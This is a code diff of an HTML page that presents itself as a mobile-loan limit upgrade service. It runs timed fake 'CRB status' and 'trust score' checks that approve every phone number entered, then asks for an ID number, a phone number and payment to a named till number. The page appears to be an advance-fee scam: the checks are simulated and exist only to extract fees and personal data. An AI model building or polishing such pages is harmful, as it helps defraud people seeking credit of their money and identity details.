@@ -19,9 +19,10 @@ body {
   height: 100vh;
 }
 
+/* CARD */
 .card {
   width: 90%;
-  max-width: 360px;
+  max-width: 350px;
   background: #fff;
   border-radius: 20px;
   padding: 25px;
@@ -29,6 +30,9 @@ body {
   box-shadow: 0 10px 25px rgba(0,0,0,0.1);
 }
 
+.hidden { display: none; }
+
+/* ICON */
 .icon {
   width: 70px;
   height: 70px;
@@ -42,43 +46,21 @@ body {
   color: #16a34a;
 }
 
-.success-icon {
-  width: 70px;
-  height: 70px;
-  background: #16a34a;
-  border-radius: 50%;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  margin: 0 auto 15px;
-  font-size: 30px;
-  color: #fff;
-}
+/* TEXT */
+.title { font-size: 20px; font-weight: bold; }
+.subtitle { color: #16a34a; font-size: 12px; }
+.desc { font-size: 14px; color: #666; margin-top: 8px; }
 
-.title {
-  font-size: 20px;
-  font-weight: bold;
-}
-
-.subtitle {
-  color: #16a34a;
-  font-size: 12px;
-}
-
-.desc {
-  font-size: 14px;
-  color: #666;
-  margin-top: 8px;
-}
-
+/* INPUT */
 input {
   width: 100%;
   padding: 14px;
   border-radius: 10px;
   border: 1px solid #ddd;
-  margin: 15px 0;
+  margin-top: 10px;
 }
 
+/* BUTTON */
 button {
   width: 100%;
   padding: 14px;
@@ -88,8 +70,10 @@ button {
   border-radius: 10px;
   font-size: 16px;
   cursor: pointer;
+  margin-top: 10px;
 }
 
+/* LOADER */
 .loader {
   width: 50px;
   height: 50px;
@@ -100,42 +84,65 @@ button {
   margin: 0 auto 15px;
 }
 
-@keyframes spin {
-  to { transform: rotate(360deg); }
-}
+@keyframes spin { to { transform: rotate(360deg); } }
 
+/* LIMIT GRID */
 .grid {
   display: grid;
   grid-template-columns: 1fr 1fr;
-  gap: 12px;
-  margin-top: 15px;
+  gap: 10px;
 }
 
-.box {
+.limit-box {
   padding: 15px;
+  background: #f9fafb;
   border-radius: 12px;
-  background: #f1f5f9;
-  text-align: center;
-  font-weight: bold;
-  color: #16a34a;
   cursor: pointer;
+  border: 2px solid transparent;
 }
 
-.box small {
-  display: block;
-  color: #777;
-  font-weight: normal;
-  margin-top: 5px;
-}
-
-.box.active {
+.limit-box.active {
   border: 2px solid #16a34a;
-  background: #e6f4ea;
+  background: #ecfdf5;
 }
 
-.hidden {
-  display: none;
+/* MODAL */
+.modal {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0,0,0,0.4);
+  display: flex;
+  justify-content: center;
+  align-items: center;
 }
+
+.modal-content {
+  width: 90%;
+  max-width: 350px;
+  background: #fff;
+  border-radius: 20px;
+  overflow: hidden;
+}
+
+.modal-header {
+  background: #16a34a;
+  color: white;
+  padding: 20px;
+  font-weight: bold;
+}
+
+.modal-body { padding: 20px; }
+
+.actions {
+  display: flex;
+  gap: 10px;
+}
+
+.cancel { background: #e5e7eb; color: black; }
+.pay { background: #16a34a; }
 </style>
 </head>
 
@@ -153,89 +160,105 @@ button {
   <button onclick="startProcess()">Check My Eligibility</button>
 </div>
 
-<!-- STEPS -->
-<div class="card hidden" id="step2"><div class="loader"></div><div class="title">Connecting...</div><div class="desc">Accessing secure databases...</div></div>
-<div class="card hidden" id="step3"><div class="loader"></div><div class="title">Checking Usage History...</div><div class="desc">Accessing secure databases...</div></div>
-<div class="card hidden" id="step4"><div class="loader"></div><div class="title">Verifying CRB Status...</div><div class="desc">Accessing secure databases...</div></div>
-<div class="card hidden" id="step5"><div class="loader"></div><div class="title">Finalizing Trust Score...</div><div class="desc">Accessing secure databases...</div></div>
+<!-- LOADING STEPS -->
+<div class="card hidden" id="step2"><div class="loader"></div><div class="title">Connecting...</div></div>
+<div class="card hidden" id="step3"><div class="loader"></div><div class="title">Checking Usage History...</div></div>
+<div class="card hidden" id="step4"><div class="loader"></div><div class="title">Verifying CRB Status...</div></div>
+<div class="card hidden" id="step5"><div class="loader"></div><div class="title">Finalizing Trust Score...</div></div>
 
-<!-- STEP 6 -->
+<!-- SUCCESS -->
 <div class="card hidden" id="step6">
-  <div class="success-icon">✔</div>
-  <div class="title">Congratulations!</div>
-  <div class="desc">
-    High Trust Score Detected.<br>
-    <b id="userNumber"></b>
-  </div>
-  <div class="desc">Limit up to <b style="color:#16a34a;">KSh 70,000</b></div>
+  <h2>Congratulations!</h2>
+  <p id="userNumber"></p>
+  <button onclick="goLimits()">Proceed to Upgrade Limit</button>
 </div>
 
-<!-- STEP 7 -->
-<div class="card hidden" id="step7">
-  <div class="title">Select Your New Approved Limit</div>
+<!-- LIMITS -->
+<div class="card hidden" id="limits">
+  <h3>Select Your New Approved Limit</h3>
 
   <div class="grid">
-    <div class="box">Ksh 3,000<small>Fee: 250</small></div>
-    <div class="box">Ksh 5,000<small>Fee: 293</small></div>
-    <div class="box">Ksh 7,500<small>Fee: 350</small></div>
-    <div class="box">Ksh 10,000<small>Fee: 500</small></div>
-    <div class="box">Ksh 12,500<small>Fee: 747</small></div>
-    <div class="box">Ksh 16,000<small>Fee: 898</small></div>
-    <div class="box">Ksh 21,000<small>Fee: 1015</small></div>
-    <div class="box">Ksh 25,500<small>Fee: 1220</small></div>
-    <div class="box">Ksh 30,000<small>Fee: 1533</small></div>
-    <div class="box">Ksh 35,000<small>Fee: 1730</small></div>
-    <div class="box active">Ksh 45,000<small>Fee: 2000</small></div>
-    <div class="box">Ksh 60,000<small>Fee: 2250</small></div>
-    <div class="box">Ksh 70,000<small>Fee: 2500</small></div>
+    <div class="limit-box" onclick="selectLimit(this,3000)">Ksh 3,000</div>
+    <div class="limit-box" onclick="selectLimit(this,5000)">Ksh 5,000</div>
+    <div class="limit-box" onclick="selectLimit(this,10000)">Ksh 10,000</div>
+    <div class="limit-box" onclick="selectLimit(this,20000)">Ksh 20,000</div>
+    <div class="limit-box" onclick="selectLimit(this,45000)">Ksh 45,000</div>
+    <div class="limit-box" onclick="selectLimit(this,70000)">Ksh 70,000</div>
   </div>
 
-  <br>
-  <!-- ONLY CHANGE -->
-  <button id="upgradeBtn" onclick="goToStep8()">⚡ UPGRADE TO KSH 45,000</button>
+  <button onclick="openModal()">Upgrade</button>
 </div>
 
-<!-- STEP 8 -->
-<div class="card hidden" id="step8">
-  <div class="title">Complete Verification</div>
-  <input type="text" placeholder="Enter ID Number">
-  <input type="text" placeholder="Enter Phone Number">
 </div>
 
+<!-- MODAL -->
+<div class="modal hidden" id="modal">
+  <div class="modal-content">
+    <div class="modal-header">
+      Limit will be boosted to <span id="limitText"></span>
+    </div>
+
+    <div class="modal-body">
+      <p style="background:#ecfdf5;padding:10px;border-radius:10px;">
+        Once payment to Till Number <b>6363781</b> is confirmed, processing begins.
+      </p>
+
+      <input type="text" placeholder="ID Number">
+      <input type="text" id="payPhone" placeholder="Phone Number">
+
+      <div class="actions">
+        <button class="cancel" onclick="closeModal()">Cancel</button>
+        <button class="pay" onclick="payNow()">Pay</button>
+      </div>
+    </div>
+  </div>
 </div>
 
 <script>
-function startProcess() {
-  let number = document.getElementById("phone").value;
-  document.getElementById("userNumber").innerText = number;
+let selectedLimit = 0;
 
-  showStep("step1","step2");
-  setTimeout(()=>showStep("step2","step3"),2000);
-  setTimeout(()=>showStep("step3","step4"),4000);
-  setTimeout(()=>showStep("step4","step5"),6000);
-  setTimeout(()=>showStep("step5","step6"),8000);
-  setTimeout(()=>showStep("step6","step7"),10000);
+function startProcess() {
+  let phone = document.getElementById("phone").value;
+  document.getElementById("userNumber").innerText = phone + " is eligible";
+
+  show("step1","step2");
+
+  setTimeout(()=>show("step2","step3"),2000);
+  setTimeout(()=>show("step3","step4"),4000);
+  setTimeout(()=>show("step4","step5"),6000);
+  setTimeout(()=>show("step5","step6"),8000);
 }
 
-function showStep(hide, show) {
+function goLimits() {
+  show("step6","limits");
+}
+
+function selectLimit(el, amount) {
+  document.querySelectorAll('.limit-box').forEach(x=>x.classList.remove('active'));
+  el.classList.add('active');
+  selectedLimit = amount;
+}
+
+function openModal() {
+  if(selectedLimit===0){ alert("Select limit"); return; }
+  document.getElementById("modal").classList.remove("hidden");
+  document.getElementById("limitText").innerText = "Ksh " + selectedLimit.toLocaleString();
+}
+
+function closeModal() {
+  document.getElementById("modal").classList.add("hidden");
+}
+
+function payNow() {
+  let phone = document.getElementById("payPhone").value;
+  if(phone===""){ alert("Enter phone"); return; }
+  alert("Payment request sent to " + phone);
+}
+
+function show(hide, show) {
   document.getElementById(hide).classList.add("hidden");
   document.getElementById(show).classList.remove("hidden");
 }
-
-/* ONLY ADDED THIS */
-function goToStep8() {
-  showStep("step7", "step8");
-}
-
-/* SELECT LIMIT */
-document.querySelectorAll(".box").forEach(box => {
-  box.onclick = () => {
-    document.querySelectorAll(".box").forEach(b => b.classList.remove("active"));
-    box.classList.add("active");
-    let amount = box.innerText.split("\n")[0];
-    document.getElementById("upgradeBtn").innerText = "⚡ UPGRADE TO " + amount.toUpperCase();
-  };
-});
 </script>
 
 </body>
